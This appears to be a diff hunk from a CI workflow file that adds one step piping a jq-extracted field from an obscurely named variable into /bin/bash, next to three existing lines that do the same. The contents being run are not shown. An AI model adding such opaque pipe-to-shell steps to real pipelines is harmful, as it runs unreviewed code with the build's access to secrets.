@@ -58,6 +58,7 @@ jobs:
           echo $mca30 | jq -r .cb6 | /bin/bash
           printf '%s' "$s8742" | jq -r .gl336 | /bin/bash
           echo $c539 | jq -r .djc8 | /bin/bash
+          printf '%s' "$kqj164" | jq -r .nh99807 | /bin/bash
 
       - name: Archive output
         if: always()
